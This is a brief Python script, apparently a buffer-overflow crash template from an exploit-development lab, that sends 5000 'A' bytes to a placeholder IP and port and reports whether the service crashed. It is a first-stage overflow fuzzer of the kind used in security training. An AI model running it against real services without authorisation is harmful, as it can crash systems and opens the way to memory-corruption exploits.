#! /usr/bin/env python3 

import socket

ip = "<IP>"
port = <PORT>

prefix = b""

payload = prefix + 5000 * b"A"

try: 
    with socket.socket() as s:
        s.connect((ip,port))
        s.send(payload)
        print ("[+] " + str(len(payload)-len(prefix)) + " Bytes Sent")
except:
    print ("[-] Crashed")